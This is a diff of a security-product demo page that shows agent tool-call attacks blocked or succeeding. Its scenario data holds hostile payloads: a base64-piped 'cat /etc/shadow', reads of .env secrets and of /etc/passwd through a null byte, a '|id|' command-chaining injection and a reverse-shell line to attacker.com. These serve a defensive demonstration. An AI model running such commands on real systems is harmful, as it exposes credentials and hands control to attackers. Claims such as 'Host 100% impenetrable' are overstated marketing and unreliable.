@@ -339,20 +339,20 @@
           
           <!-- Impact Metric 1 -->
           <div class="p-4 rounded-xl bg-black/60 border border-brand-crimson/30 text-center space-y-1">
-            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">Host Security Status</div>
+            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">System Integrity</div>
             <div id="metric-unprot-breach" class="text-xl font-black text-brand-crimson flex items-center justify-center space-x-1.5">
               <i data-lucide="alert-triangle" class="w-5 h-5"></i>
-              <span>100% BREACH</span>
+              <span>COMPROMISED</span>
             </div>
             <div class="text-[10px] font-mono text-slate-500">Root permissions stolen</div>
           </div>
 
           <!-- Impact Metric 2 -->
           <div class="p-4 rounded-xl bg-black/60 border border-brand-crimson/30 text-center space-y-1">
-            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">Sensitive Data Leaked</div>
+            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">Data Privacy</div>
             <div id="metric-unprot-leak" class="text-xl font-black text-brand-crimson flex items-center justify-center space-x-1.5">
               <i data-lucide="radio" class="w-5 h-5"></i>
-              <span>4,096 BYTES</span>
+              <span>LEAKED</span>
             </div>
             <div class="text-[10px] font-mono text-slate-500">Exfiltrated to attacker</div>
           </div>
@@ -462,22 +462,22 @@
           
           <!-- Impact Metric 1 -->
           <div class="p-4 rounded-xl bg-black/60 border border-brand-emerald/30 text-center space-y-1">
-            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">Host Security Status</div>
+            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">System Integrity</div>
             <div id="metric-prot-breach" class="text-xl font-black text-brand-emerald flex items-center justify-center space-x-1.5">
               <i data-lucide="lock" class="w-5 h-5"></i>
-              <span>0% BREACH</span>
+              <span>PROTECTED</span>
             </div>
             <div class="text-[10px] font-mono text-slate-500">Host 100% impenetrable</div>
           </div>
 
           <!-- Impact Metric 2 -->
           <div class="p-4 rounded-xl bg-black/60 border border-brand-emerald/30 text-center space-y-1">
-            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">Sensitive Data Leaked</div>
+            <div class="text-[10px] font-mono text-slate-400 uppercase font-semibold">Data Privacy</div>
             <div id="metric-prot-leak" class="text-xl font-black text-brand-emerald flex items-center justify-center space-x-1.5">
-              <i data-lucide="shield" class="w-5 h-5"></i>
-              <span>0 BYTES</span>
+              <i data-lucide="shield-check" class="w-5 h-5"></i>
+              <span>SAFE</span>
             </div>
-            <div class="text-[10px] font-mono text-slate-500">Clean zero-compromise</div>
+            <div class="text-[10px] font-mono text-slate-500">Zero data accessed or read</div>
           </div>
 
         </div>
@@ -617,60 +617,60 @@
         payload: "echo Y2F0IC9ldGMvc2hhZG93 | base64 -d | sh",
         unprotStep1: "Encoded 'cat /etc/shadow' in Base64",
         unprotStep3: "Root auth hashes exfiltrated to attacker",
-        unprotBreach: "100% BREACH",
-        unprotBytes: "4,096 BYTES",
+        unprotBreach: "COMPROMISED",
+        unprotBytes: "LEAKED",
         unprotStamp: "RESULT: CRITICAL LINUX ROOT HASHES LEAKED",
         protStep2: "Decoded: 'cat /etc/shadow' from Base64",
-        protBreach: "0% BREACH",
-        protBytes: "0 BYTES",
-        protStamp: "RESULT: BLOCKED IN MEMORY // 0 BYTES LEAKED"
+        protBreach: "PROTECTED",
+        protBytes: "SAFE",
+        protStamp: "RESULT: BLOCKED IN MEMORY // ZERO DATA LEAK"
       },
       env: {
         payload: "read_file path='env/.env'",
         unprotStep1: "Direct path reading API secret file",
         unprotStep3: "GROK_API_KEY & AWS secrets dumped",
-        unprotBreach: "100% BREACH",
-        unprotBytes: "2,048 BYTES",
-        unprotStamp: "RESULT: PRODUCTION API KEYS COMPROMISED",
+        unprotBreach: "COMPROMISED",
+        unprotBytes: "EXPOSED",
+        unprotStamp: "RESULT: PRODUCTION API KEYS EXPOSED",
         protStep2: "Blocked: Path matches forbidden pattern '.env'",
-        protBreach: "0% BREACH",
-        protBytes: "0 BYTES",
-        protStamp: "RESULT: TOOL EXECUTION DENIED // SECRETS SAFE"
+        protBreach: "PROTECTED",
+        protBytes: "SAFE",
+        protStamp: "RESULT: ACCESS DENIED // SECRETS SAFE"
       },
       nullbyte: {
         payload: "read_file path='/etc/passwd%00.png'",
         unprotStep1: "Null byte %00 path traversal disguise",
         unprotStep3: "Kernel C library truncated at %00 -> read /etc/passwd",
-        unprotBreach: "100% BREACH",
-        unprotBytes: "3,120 BYTES",
-        unprotStamp: "RESULT: ARBITRARY SYSTEM FILE READ",
+        unprotBreach: "COMPROMISED",
+        unprotBytes: "EXPOSED",
+        unprotStamp: "RESULT: SYSTEM PASSWD FILE EXPOSED",
         protStep2: "Unmasked: Null byte stripped -> normalized '/etc/passwd'",
-        protBreach: "0% BREACH",
-        protBytes: "0 BYTES",
+        protBreach: "PROTECTED",
+        protBytes: "SAFE",
         protStamp: "RESULT: TRAVERSAL BLOCKED BY eBPF GATE"
       },
       chaining: {
         payload: "execute_command cmd='/index.html|id|'",
         unprotStep1: "Subshell delimiter injection probe",
         unprotStep3: "Shell executed 'id' with full root permissions",
-        unprotBreach: "100% BREACH",
-        unprotBytes: "1,540 BYTES",
+        unprotBreach: "COMPROMISED",
+        unprotBytes: "HIJACKED",
         unprotStamp: "RESULT: ROOT COMMAND EXECUTION ACHIEVED",
         protStep2: "Flagged: Command chaining token '|id|' detected",
-        protBreach: "0% BREACH",
-        protBytes: "0 BYTES",
+        protBreach: "PROTECTED",
+        protBytes: "SAFE",
         protStamp: "RESULT: COMMAND CHAIN DROPPED BEFORE EXEC"
       },
       reverse: {
         payload: "python3 -c 'import socket; s.connect((\"attacker.com\", 8080))'",
         unprotStep1: "Outbound socket reverse shell command",
         unprotStep3: "Interactive remote bash shell attached to C2",
-        unprotBreach: "100% BREACH",
-        unprotBytes: "FULL CONTROL",
+        unprotBreach: "COMPROMISED",
+        unprotBytes: "TAKEOVER",
         unprotStamp: "RESULT: CATASTROPHIC REMOTE HOST TAKEOVER",
         protStep2: "Flagged: Reverse TCP socket spawn signature",
-        protBreach: "0% BREACH",
-        protBytes: "0 BYTES",
+        protBreach: "PROTECTED",
+        protBytes: "SAFE",
         protStamp: "RESULT: SOCKET TERMINATED VIA TCP RST"
       }
     };
